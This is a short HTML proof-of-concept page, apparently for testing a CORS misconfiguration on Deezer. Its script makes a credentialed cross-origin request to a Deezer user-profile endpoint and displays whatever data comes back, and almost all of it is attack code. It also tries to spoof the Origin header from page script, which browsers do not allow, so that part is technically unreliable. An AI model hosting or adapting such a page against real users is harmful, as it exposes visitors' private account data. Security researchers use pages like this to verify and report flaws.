<!DOCTYPE html>
<html>
<head>
  <title>Deezer CORS Misconfiguration PoC</title>
</head>
<body>
  <h1>Deezer CORS Attack Test</h1>
  <p>If successful, this page will retrieve sensitive data from Deezer.</p>

  <script>
    fetch("https://www.deezer.com/user-profile-endpoint", {
      method: "GET",
      credentials: "include",
      headers: {
        "Origin": "https://evilwww.deezer.com"
      }
    })
    .then(response => response.text())
    .then(data => {
      console.log("Sensitive data from Deezer:", data);
      alert("Data retrieved: " + data);
    })
    .catch(err => {
      console.error("CORS Attack Failed:", err);
      alert("CORS Attack Failed. No data retrieved.");
    });
  </script>
</body>
</html>
